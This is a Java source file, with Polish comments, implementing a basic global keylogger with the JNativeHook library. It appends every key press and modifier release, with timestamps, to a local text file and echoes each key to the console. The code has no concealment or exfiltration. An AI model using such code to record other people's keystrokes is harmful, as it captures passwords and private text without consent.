package rwilk.logger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

/**
 * Created by Rafal Wilk
 */
public class GlobalKeyListener implements NativeKeyListener {

    private static final DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss:SSS");

    /**
     * Metoda wykonuje sie w momencie wcisniecia klawisza na klawiaturze.
     * Tekst przypisany do wcisnietego klawisza dopisujemy do pliku.
     *
     * @param e zdarzenie wcisnieca klawisza
     */
    public void nativeKeyPressed(NativeKeyEvent e) {
        Calendar calendar = Calendar.getInstance();
        writeToFile("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()), calendar.getTime());
        System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    /**
     * Metoda wykonuje sie w momencie puszczenia klawisza na klawiaturze.
     * Jesli puszczony klawisz byl klawiszem funkcyjnym - zapisujemy go do pliku.
     *
     * @param e zdarzenie wcisnieca klawisza
     */
    public void nativeKeyReleased(NativeKeyEvent e) {
        if (e.getKeyCode() == NativeKeyEvent.VC_ALT ||
                e.getKeyCode() == NativeKeyEvent.VC_CONTROL ||
                e.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK ||
                e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
            Calendar calendar = Calendar.getInstance();
            writeToFile("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()), calendar.getTime());
        }
    }

    /**
     * Metoda wywoluje sie w momencie nacisniecia przycisku. Metoda potrafi rozpoznac, czy wcisnieta byla mala/duza litera.
     * Nie dziala, bo nie ma zaimplementowanej mapy klawiszy.
     *
     * @param e zdarzenie wcisnieca klawisza
     */
    public void nativeKeyTyped(NativeKeyEvent e) {
        e.getKeyChar();
    }

    /**
     * Metoda dopusuje tekst na koncy pliku. W przypadku, gdy plik nie istenieje - zostanie on stworzony.
     *
     * @param text tekst, ktory chcemy dopisac do pliku
     * @param date dokladny czas wystapienia zdarzenia
     */
    private void writeToFile(String text, Date date) {
        try {
            Writer output = new BufferedWriter(new FileWriter("keyListener.txt", true));
            output.append(dateFormat.format(date)).append("\t").append(text).append("\n");
            output.close();
        } catch (IOException ioe) {
            ioe.printStackTrace();
        }
    }
}